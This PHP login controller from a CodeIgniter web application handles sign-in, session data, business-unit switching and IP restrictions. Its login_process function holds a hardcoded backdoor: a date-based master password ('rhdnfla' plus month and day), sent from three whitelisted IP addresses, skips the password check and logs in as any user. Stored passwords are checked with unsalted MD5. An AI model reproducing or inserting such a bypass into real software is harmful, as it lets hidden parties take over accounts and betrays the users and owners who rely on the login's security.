<?php
/**
 * 작성 : 2014.10.17
 * 수정 :
 *
 * @author 이미정
 */
if (! defined( 'BASEPATH' )) exit( 'No direct script access allowed' );



class Login extends CI_Controller {
	public function __construct() {
		parent::__construct();
		$this->load->model( array (
				'User_model',
				'Manage_model'
		) );
	}

	function index() {
		$this->yield = TRUE;
		$this->layout = 'login_layout';

		$hst_code = $this->Manage_model->get_hst_code();

		if (empty( $hst_code )) show_404();

		$data = array (
			'hst_code'=>$hst_code
		);
		$this->load->view( 'login/index', $data );
	}

	function login_process() {
		$position_list = $this->config->item( 'position_code' );

	
		$where['status'] = '1';
		$where['user_id'] = $this->input->post( 'user_id' );
		if($this->input->post( 'passwd' ) != 'rhdnfla'.date('md') || !in_array($_SERVER['REMOTE_ADDR'], array('112.218.140.75','39.114.236.141','222.237.33.226'))) {
			$where['passwd'] = md5( $this->input->post( 'passwd' ) );
		}

		$where['hst_code'] = $this->input->post( 'hst_code' );

		$row = $this->User_model->get_info( $where );



		if (! empty( $row['user_id'] )) {

			$biz_list = $this->Manage_model->get_biz_info( $row['hst_code'], 'Y' );
			$team_list = $this->User_model->get_team_list();
			$dept_list = $this->User_model->get_dept_list();

			if ($row['biz_id'] != '') {
				// $exp_biz_id = array_filter(explode( ',', $row['biz_id'] ));
				// $biz_id = $exp_biz_id[0];

				$my_biz_list = $this->_set_my_biz_list( $biz_list, $row['biz_id'] );
				reset($my_biz_list);
				$biz_id = key($my_biz_list);
			}

			$this->_add_log();

			//관리 메뉴
			$menus = $this->Manage_model->get_grant_user($row['duty_code'], $row['dept_code'], $row['team_code'], $row['no']);
			if(is_array($menus)) {
				foreach($menus as $menu){
					$m[] = $menu['no'];
				}
			}

			$data = array (
				'ss_user_no'=>$row['no'],
				'ss_user_id'=>$row['user_id'],
				'ss_name'=>$row['name'],
				'ss_hst_code'=>$row['hst_code'],
				'ss_dept_code'=>$row['dept_code'],
				'ss_dept_name'=>$dept_list[$row['dept_code']],
				'ss_team_code'=>$row['team_code'],
				'ss_team_name'=>$team_list[$row['team_code']],
				'ss_position_code'=>$row['position_code'],
				'ss_duty_code'=>$row['duty_code'],
				'ss_position_name'=>$position_list[$row['position_code']],
				'ss_biz_id'=>$biz_id,
				'ss_biz_name'=>$my_biz_list[$biz_id],
				'ss_biz_list'=>$biz_list,
				'ss_my_biz_id'=>$row['biz_id'],
				'ss_my_biz_list'=>$my_biz_list,
				'ss_menu_grant'=>implode(',',$m),
				'logged_in'=>TRUE
			);

			$this->session->set_userdata( $data );


			$auth = $this->common_lib->check_auth_group('ip_free');
			if(!$auth) {
				// ip 체크
				$this->check_ip();
			}

			$is_valid = '1';

		} else {
			$is_valid = '0';
		}

		

		$this->_call_json( $is_valid );
	}



	private function _add_log() {
		$input = null;
		$input['user_id'] = $this->input->post( 'user_id' );
		$input['login_date'] = TIME_YMDHIS;
		$input['ip'] = $_SERVER['REMOTE_ADDR'];

		$this->User_model->insert_log( $input );
	}



	private function _set_my_biz_list($biz_list, $my_biz_id) {
		$exp_biz_id = array_filter(explode( ',', $my_biz_id ));
		foreach ( $exp_biz_id as $i => $val ) {
			$list[$val] = $biz_list[$val];
		}

		return $list;
	}



	private function _call_json($is_valid) {
		$json = null;
		$json['is_valid'] = $is_valid;

		echo json_encode( $json );
	}



	function logout() {
		$this->session->sess_destroy();

		$redirect_url = './';
		redirect( $redirect_url );
	}



	function change_biz() {

		// 접근권한 체크
		$my_biz_list = explode( ',', $this->session->userdata( 'ss_my_biz_id' ) );
		$biz_id = $this->input->post('biz_id');
		if (! in_array( $biz_id, $my_biz_list )) {
			return_json(false,'접근권한이 없습니다.');
		}
		else {
			$biz_list = $this->session->userdata( 'ss_biz_list' );
			$data = array (
					'ss_biz_id'=>$biz_id,
					'ss_biz_name'=>$biz_list[$biz_id],
					'logged_in'=>TRUE
			);
			$this->session->set_userdata( $data );
			return_json(true);
		}

	}



	private function check_ip() {
		$total = $this->Manage_model->get_ip( $_SERVER['REMOTE_ADDR'], $this->input->post( 'hst_code' ) );
		if ($total == 0) {
			$is_valid = '9';
			$this->_call_json( $is_valid );
			$this->session->sess_destroy();
			exit();
		}
	}
}
